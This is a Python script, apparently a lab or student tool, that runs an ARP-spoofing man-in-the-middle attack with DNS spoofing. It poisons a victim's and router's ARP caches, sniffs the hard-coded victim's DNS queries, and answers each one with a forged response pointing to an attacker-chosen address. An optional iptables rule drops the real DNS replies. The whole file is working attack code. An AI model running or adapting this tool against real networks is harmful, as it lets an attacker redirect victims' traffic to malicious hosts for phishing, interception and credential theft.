#!/usr/bin/python

import ConfigParser, os, platform, sys, signal, multiprocessing, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
import argparse
import scapy
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
import arpSpoof, scan

operatingSystem = platform.system()
victimIP = '192.168.0.19'

def configSectionMap(section):
    dict = {}
    config = ConfigParser.ConfigParser()
    config.read('arp.config')
    options = config.options(section)
    for option in options:
        try:
            dict[option] = config.get(section, option)
            if dict[option] == -1:
                DebugPrint("skip: %s" % option)
        except:
            print ("exception on %s!" % option)
            dict[option] = None
    return dict

def signalHandler(signal, frame):
    default()
    sys.exit(0)

def forward():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=1')
    elif operatingSystem == 'Linux':
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def default():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=0')
    elif operatingSystem == 'Linux':
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        os.system('iptables -F')

def parse(packet):
    if packet.haslayer(IP):
        if packet[0][1].src == '192.168.0.19':
            if packet.haslayer(DNS):
                if DNSQR in packet:
                    packetResponse = (Ether()/IP(dst=packet[0][1].src, src=packet[0][1].dst)/\
                                  UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                                  DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                                  an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata="192.168.0.18")))
                    sendp(packetResponse, count=1, verbose=0)

def firewallRule():
	firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
	Popen([firewall], shell=True, stdout=PIPE)

def main():
    forward()
    variables = configSectionMap('ARP')
    arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof
                                        , args = (variables['routerip']
                                                 , variables['routermac']
                                                 , variables['victimip']
                                                 , variables['victimmac']
                                                 , variables['ourmac']))
    arpProcess.start()
    signal.signal(signal.SIGINT, signalHandler)
    sniffFilter="udp and port 53"
    sniff(filter=sniffFilter, prn=parse, count=0)
    signal.pause()
    arpProcess.terminate()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip"
                       ,"--iptablesRule"
                       , help="use an iptables rule to drop all dns traffic on forward chain"
                       ,action="store_true")
    args = parser.parse_args()
    if args.iptablesRule:
        firewallRule()
    try:
        main()
    except KeyboardInterrupt:
        print 'exiting..'
